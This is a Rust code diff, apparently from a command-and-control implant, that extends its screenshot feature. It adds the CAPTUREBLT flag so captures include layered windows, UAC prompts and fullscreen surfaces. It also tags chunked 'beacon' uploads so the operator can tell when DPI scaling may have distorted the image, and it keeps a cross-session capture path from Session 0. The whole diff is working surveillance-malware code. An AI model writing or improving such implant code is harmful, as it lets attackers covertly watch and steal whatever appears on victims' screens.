@@ -30,7 +30,17 @@ pub use nyx_protocol::Response;
 // ---- Win32 / GDI constants -------------------------------------------------
 
 /// `SRCCOPY` raster-op for `BitBlt` — copy the source rectangle verbatim.
+///
+/// Combined with [`CAPTUREBLT`] below (the `BitBlt` call uses `SRCCOPY |
+/// CAPTUREBLT`), this also captures layered windows (`WS_EX_LAYERED`),
+/// anti-aliased/UAC popups, hardware overlays, and fullscreen DX/GL
+/// surfaces that plain `SRCCOPY` would skip — yielding only a corner or
+/// missing regions of the screen.
 const SRCCOPY: u32 = 0x00CC_0020;
+/// `CAPTUREBLT` — includes layered + overlay windows in the `BitBlt` result.
+/// OR'd into `SRCCOPY` so the capture covers every visible surface, not just
+/// the main display plane.
+const CAPTUREBLT: u32 = 0x4000_0000;
 /// Virtual-screen metrics: the bounding rect of ALL displays combined.
 /// SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN = top-left of the virtual desktop
 /// (NEGATIVE when a secondary display sits to the left/above the primary —
@@ -273,14 +283,18 @@ unsafe fn attach_interactive() -> bool {
 
 /// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
 /// desktop (same-session), captures the full virtual screen (all monitors),
-/// BMP file bytes. `None` on any failure. Shared by `do_screenshot` (beacon
-/// path, streams chunks) and `capture_to_file` (helper export, writes file).
-fn capture_bmp() -> Option<Vec<u8>> {
+/// into a BMP. `None` on any failure. Shared by `do_screenshot` (beacon path,
+/// streams chunks) and `capture_to_file` (helper export, writes file).
+///
+/// Returns the BMP bytes plus `true` if DPI awareness was set successfully,
+/// `false` if all three DPI APIs failed (the capture still proceeds but may be
+/// DPI-virtualized — `do_screenshot` flags this in the chunk filename).
+fn capture_bmp() -> Option<(Vec<u8>, bool)> {
     if !force_load(b"user32.dll") || !force_load(b"gdi32.dll") {
         return None;
     }
     // DPI aware must come BEFORE any GetDC / CreateCompatibleBitmap.
-    let _ = set_dpi_aware();
+    let dpi_aware = set_dpi_aware();
     let _ = unsafe { attach_interactive() };
 
     type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
@@ -365,7 +379,7 @@ fn capture_bmp() -> Option<Vec<u8>> {
         let prev = so(mdc, bmp);
         // Source origin = virtual-screen top-left (may be negative). Destination
         // = (0,0) in the memory DC. This blits every monitor into one bitmap.
-        if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY) == 0 {
+        if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) == 0 {
             so(mdc, prev);
             do_(bmp);
             ddc(mdc);
@@ -422,7 +436,7 @@ fn capture_bmp() -> Option<Vec<u8>> {
     b.extend_from_slice(&0u32.to_le_bytes());
     b.extend_from_slice(&0u32.to_le_bytes());
     b.extend_from_slice(&pixels);
-    Some(b)
+    Some((b, dpi_aware))
 }
 
 /// Create `path` (ASCII, NUL-terminated) and write `data` to it, advancing by
@@ -495,7 +509,7 @@ unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
 /// Capture → write BMP to `path` (ASCII, NUL-terminated). Helper export path.
 pub unsafe fn capture_to_file(path: &[u8]) -> bool {
     let bmp = match capture_bmp() {
-        Some(b) => b,
+        Some((b, _dpi_aware)) => b,
         None => return false,
     };
     unsafe { write_all_to_file(path, &bmp) }
@@ -520,9 +534,19 @@ pub fn do_screenshot(monitor: u8) -> Vec<Response> {
     unsafe {
         XSESS_FAIL = 0;
     }
-    // Path 1: same-session direct capture.
-    if let Some(bmp) = capture_bmp() {
-        return chunk_stream(bmp, "screenshot.bmp");
+    // Path 1: same-session direct capture. `dpi_aware` records whether the
+    // three-tier DPI fallback succeeded. When it failed the capture still
+    // proceeds (the screenshot may be usable at the DPI-virtualized scale) but
+    // we prefix the chunk filename with "dpi-unaware-" so the operator can see
+    // in the downloaded name that the dimensions may be wrong — the implant is
+    // no_std with no logger, so the filename is the only durable signal.
+    if let Some((bmp, dpi_aware)) = capture_bmp() {
+        let name = if dpi_aware {
+            "screenshot.bmp"
+        } else {
+            "dpi-unaware-screenshot.bmp"
+        };
+        return chunk_stream(bmp, name);
     }
     // Path 2: cross-session (Session 0 → active interactive session).
     match unsafe { cross_session_capture() } {
